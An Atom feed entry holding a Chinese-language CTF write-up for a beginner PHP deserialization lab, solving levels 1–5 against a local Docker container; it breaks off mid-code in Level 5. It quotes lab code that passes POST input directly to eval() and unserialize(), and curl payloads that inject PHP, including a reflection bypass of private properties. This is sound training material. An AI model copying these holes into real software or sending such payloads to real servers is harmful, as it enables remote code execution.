<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Moyuin&#39;s Note</title>
  
  <subtitle>一个随笔记录的地方。</subtitle>
  <link href="https://notes.moyuin.top/atom.xml" rel="self"/>
  
  <link href="https://notes.moyuin.top/"/>
  <updated>2025-08-25T07:32:51.000Z</updated>
  <id>https://notes.moyuin.top/</id>
  
  <author>
    <name>Moyuin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello CTF 从 0 开始的PHP反序列化入门靶场</title>
    <link href="https://notes.moyuin.top/2025/08/25/xue-xi/ctf/hello-ctf-cong-0-kai-shi-de-php-fan-xu-lie-hua-ru-men-ba-chang-writeup/"/>
    <id>https://notes.moyuin.top/2025/08/25/xue-xi/ctf/hello-ctf-cong-0-kai-shi-de-php-fan-xu-lie-hua-ru-men-ba-chang-writeup/</id>
    <published>2025-08-25T07:32:51.000Z</published>
    <updated>2025-08-25T07:32:51.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>Hello CTF - 从 0 开始的PHP反序列化入门靶场 writeup</h1><p>Repo: <a href="https://github.com/ProbiusOfficial/PHPSerialize-labs">github.com/ProbiusOfficial/PHPSerialize-labs</a><br>讨厌 PHP……不过也是做上了探姬老师出的题了。</p><h2 id="部署">部署</h2><p>直接 docker 部署。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">8081</span>:80 <span class="token parameter variable">-d</span> ghcr.io/probiusofficial/phpserialize-labs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接访问 <a href="localhost:8081">localhost:8081</a> 即可进入页面。</p><p><img src="https://s3.moyuin.top/blog-images/2025/08/25/68ac18778ad94.png" alt="image.png"></p><hr><h2 id="Level-1">Level 1</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/*  --- HelloCTF - 反序列化靶场 关卡 1 : 类的实例化 ---     HINT：尝实例化下面的FLAG类吧！    # -*- coding: utf-8 -*-  # @Author: 探姬  # @Date:   2024-07-01 20:30  # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  # @email:  admin@hello-ctf.com  # @link:   hello-ctf.com    */</span>      <span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span><span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token variable">$flag_string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF&#123;？？？？&#125;"</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag_string</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>古法 curl 炮制 post 请求，让 <code>code=new FLAG();</code> 。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">"code=new FLAG();"</span> http://localhost:8081/Level1/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>或者使用 burpsuite 发送 post 请求，将 GET 改为 POST，在最后 body 里添加</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php">code<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>发送 POST 请求需要带 header</strong>：<code>Content-Type: application/x-www-form-urlencoded</code></p><p>得到 flag</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">HelloCTF&#123;OK_Now_y0u_c4n_se3_me&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Level-2">Level 2</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">`<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token comment">/*   --- HelloCTF - 反序列化靶场 关卡 2 : 类值的传递 ---       HINT：尝试将flag传递出来~      # -*- coding: utf-8 -*-   # @Author: 探姬   # @Date:   2024-07-01 20:30   # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs   # @email:  admin@hello-ctf.com   # @link:   hello-ctf.com      */</span>      <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$flag_string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF&#123;？？？？&#125;"</span><span class="token punctuation">;</span>        <span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span><span class="token punctuation">&#123;</span>           <span class="token keyword">public</span> <span class="token variable">$free_flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">;</span>              <span class="token keyword">function</span> <span class="token function-definition function">get_free_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">free_flag</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>   <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$target</span><span class="token operator">-></span><span class="token function">get_free_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   Now Flag is <span class="token operator">??</span><span class="token operator">?</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一样是发送 POST 请求，但是设定好 code 后给 target 的 free_flag 修改为<br><code>$flag_string</code> 即可。</p><ul><li>对于 burpsuite，将 GET 改为 POST 后，在最后 body 添加：</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php">code<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$target</span><span class="token operator">-></span><span class="token property">free_flag</span><span class="token operator">=</span><span class="token variable">$flag_string</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>对于 curl，curl 在终端对 <code>$</code> 有特殊处理，需要使用单引号包裹请求。<blockquote><p><code>$</code> 符号在 Linux/macOS 的终端（我们称之为 Shell，例如 Bash、Zsh）里是一个有特殊含义的字符。它被用来<strong>引用变量</strong>。</p></blockquote></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">'code=new FLAG();$target->free_flag=$flag_string;'</span> http://localhost:8081/Level2/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Now Flag is HelloCTF&#123;I_giv3_t0_y0u&amp;y0u_giv3_t0_me&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Level-3">Level 3</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*  --- HelloCTF - 反序列化靶场 关卡 3 : 对象中值的权限 ---     HINT：尝试将flag传递出来~    # -*- coding: utf-8 -*-  # @Author: 探姬  # @Date:   2024-07-01 20:30  # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  # @email:  admin@hello-ctf.com  # @link:   hello-ctf.com    */</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span><span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token variable">$public_flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF&#123;?"</span><span class="token punctuation">;</span>      <span class="token keyword">protected</span> <span class="token variable">$protected_flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"?"</span><span class="token punctuation">;</span>      <span class="token keyword">private</span> <span class="token variable">$private_flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"?&#125;"</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">get_protected_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">protected_flag</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">get_private_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">private_flag</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">SubFLAG</span> <span class="token keyword">extends</span> <span class="token class-name">FLAG</span><span class="token punctuation">&#123;</span>      <span class="token keyword">function</span> <span class="token function-definition function">show_protected_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">protected_flag</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">show_private_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">private_flag</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$sub_target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubFLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Trying to get FLAG...&lt;br>"</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Public Flag: "</span><span class="token operator">.</span><span class="token variable">$target</span><span class="token operator">-></span><span class="token property">public_flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Protected Flag:"</span><span class="token operator">.</span><span class="token variable">$target</span><span class="token operator">-></span><span class="token property">protected_flag</span> <span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Private Flag:"</span><span class="token operator">.</span><span class="token variable">$target</span><span class="token operator">-></span><span class="token property">private_flag</span> <span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span>Trying to get FLAG...  Public Flag: HelloCTF&#123;se3_me_  Protected Flag: Error: Cannot access protected property FLAG:: in ?  Private Flag: Error: Cannot access private property FLAG:: in ?  ...Wait,where is the flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拼接 flag，一个一个来。<br>Public 类是可以直接读取的。<br>Protected 是子类可以读取的，<code>echo $sub_target-&gt;show_protected_flag();</code> 可得到。<br>Private 类是子类也不可读取，只能通过 PHP 特性获取。</p><p>常用的方法是，在PHP 有一个反射越权特性，可以通过构造反射类，在反射类里面设定访问权限，从而读取 private 内容。</p><blockquote><p>PHP 提供了一整套强大的“反射”API，它允许程序在运行时检查自身的结构，包括类、方法、属性等，甚至可以无视 <code>private</code> 和 <code>protected</code> 的限制。这是最常用、最正规的“越权”方法。<br><strong>核心思想</strong>：</p><ol><li>获取这个类的反射实例 (<code>ReflectionClass</code>)。</li><li>从反射实例中获取私有属性的反射实例 (<code>ReflectionProperty</code>)。</li><li><strong>使用 <code>setAccessible(true)</code> 方法，强行将这个私有属性设置为“可访问”</strong>。</li><li>读取属性的值。</li></ol></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 首先必须有一个 FLAG 类的具体对象</span><span class="token comment">// 这个对象已经存在了，比如叫 $target</span><span class="token comment">// 如果没有，需要自己 new 一个</span><span class="token comment">// 获取 FLAG 类的反射</span><span class="token variable">$reflection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取私有属性 private_flag</span><span class="token variable">$property</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-></span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'private_flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置属性为可访问</span><span class="token variable">$property</span><span class="token operator">-></span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 从这个实例中获取值，而不是从 $reflection 中获取</span><span class="token variable">$secret_value</span> <span class="token operator">=</span> <span class="token variable">$property</span><span class="token operator">-></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$secret_value</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从而构造 POST 的 payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">code<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$target</span><span class="token operator">-></span><span class="token property">public_flag</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sub_target</span><span class="token operator">-></span><span class="token function">show_protected_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$reflection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$property</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-></span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'private_flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$property</span><span class="token operator">-></span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$secret_value</span> <span class="token operator">=</span> <span class="token variable">$property</span><span class="token operator">-></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$secret_value</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者发送 curl 请求：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">'code=new FLAG();echo $target->public_flag;echo $sub_target->show_protected_flag();$reflection = new ReflectionClass('</span>FLAG<span class="token string">');$property =$reflection->getProperty('</span>private_flag<span class="token string">');$property->setAccessible(true);$secret_value = $property->getValue($target);echo $secret_value;'</span> http://localhost:8081/Level3/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">HelloCTF&#123;se3_me_4nd_g3t_mmmme&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Level-4">Level 4</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*  --- HelloCTF - 反序列化靶场 关卡 4 : 序列化 ---     HINT：嗯！？全是私有，怎么获取flag呢？试试序列化！    # -*- coding: utf-8 -*-  # @Author: 探姬  # @Date:   2024-07-01 20:30  # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  # @email:  admin@hello-ctf.com  # @link:   hello-ctf.com    */</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG3</span><span class="token punctuation">&#123;</span>      <span class="token keyword">private</span> <span class="token variable">$flag3_object_array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"？"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span><span class="token punctuation">&#123;</span>       <span class="token keyword">private</span> <span class="token variable">$flag1_string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"？"</span><span class="token punctuation">;</span>       <span class="token keyword">private</span> <span class="token variable">$flag2_number</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">;</span>       <span class="token keyword">private</span> <span class="token variable">$flag3_object</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag3_object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token variable">$flag_is_here</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于 PHP 反序列化的知识：</p><blockquote><p><strong>序列化 (<code>serialize</code>)</strong>：将一个对象（或数组等）的状态，转换成一个可以存储或传输的字符串。<br><strong>反序列化 (<code>unserialize</code>)</strong>：读取序列化后的字符串，并在内存中重建出原始的对象。</p></blockquote><p>序列化示例：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">SecretVault</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$secret_key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"CTF&#123;...&#125;"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$owner</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Alice"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$vault</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecretVault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 把 $vault 对象序列化</span><span class="token variable">$serialized_string</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$vault</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$serialized_string</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出的字符串会是这样的：</p><pre class="line-numbers language-none"><code class="language-none">O:10: &quot;SecretVault&quot;:2:&#123;s:25: &quot; SecretVault secret_key&quot;;s:9: &quot;CTF&#123;...&#125;&quot;;s:5: &quot;owner&quot;;s:5: &quot;Alice&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个字符串看起来复杂，但很有规律：</p><ul><li><code>O</code>: 表示这是一个对象 (Object)。</li><li><code>10</code>: 表示类名的长度是 10个字符 (<code>SecretVault</code>)。</li><li><code>&quot;SecretVault&quot;</code>: 类名。</li><li><code>2</code>: 表示这个对象有 2个属性。</li><li><code>&#123;...&#125;</code>: 花括号里是所有属性的描述。</li><li><code>s:5:&quot;owner&quot;;s:5:&quot;Alice&quot;;</code>: 描述 <code>public</code> 属性 <code>owner</code>，<code>s</code> 代表字符串，<code>5</code> 是长度。</li><li><code>s:25:&quot;\0SecretVault\0secret_key&quot;;s:9:&quot;CTF&#123;...&#125;&quot;;</code>: 描述 <code>private</code> 属性 <code>secret_key</code>。<br><strong>这里出现了带空字节的特殊键名，可利用序列化处理获取 flag</strong>。</li></ul><p>依赖这个原理，构造这样的 payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">code<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$flag_is_here</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到(做一下切分处理，大括号拆开，分号隔行)：</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;FLAG&quot;:3:&#123;s:18:&quot;FLAGflag1_string&quot;;s:8:&quot;ser4l1ze&quot;;s:18:&quot;FLAGflag2_number&quot;;i:2;s:18:&quot;FLAGflag3_object&quot;;O:5:&quot;FLAG3&quot;:1:&#123;s:25:&quot;FLAG3flag3_object_array&quot;;a:2:&#123;i:0;s:3:&quot;se3&quot;;i:1;s:2:&quot;me&quot;;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把 s 开头也就是 string 全部提取出来，得到：</p><ul><li>Flag 1_string:  ser4l1ze,</li><li>Flag2_number:  2,</li><li>Flag3_object: se3, me<br>根据出现顺序，得到 flag（用下划线连接）</li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">HelloCTF&#123;ser4l1ze_2_se3_me&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Level-5">Level 5</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*  --- HelloCTF - 反序列化靶场 关卡 5 : 序列化规则 ---     HINT：各有千秋~    # -*- coding: utf-8 -*-  # @Author: 探姬  # @Date:   2024-07-01 20:30  # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  # @email:  admin@hello-ctf.com  # @link:   hello-ctf.com    */</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">a_class</span><span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token variable">$a_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a_object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a_class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$a_array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>a<span class="token operator">=></span><span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">,</span>b<span class="token operator">=></span><span class="token string double-quoted-string">"CTF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$a_string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF"</span><span class="token punctuation">;</span>  <span class="token variable">$a_number</span> <span class="token operator">=</span> <span class="token number">678470</span><span class="token punctuation">;</span>  <span class="token variable">$a_boolean</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>  <span class="token variable">$a_null</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token comment">/*See How to serialize:  a_object: O:7:"a_class":1:&#123;s:7:"a_value";s:8:"HelloCTF";&#125;  a_array: a:2:&#123;s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";&#125;  a_string: s:8:"HelloCTF";  a_number: i:678470;  a_boolean: ;  a_null: N;  Now your turn!*/</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>    <span class="token variable">$your_object</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$your_array</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token 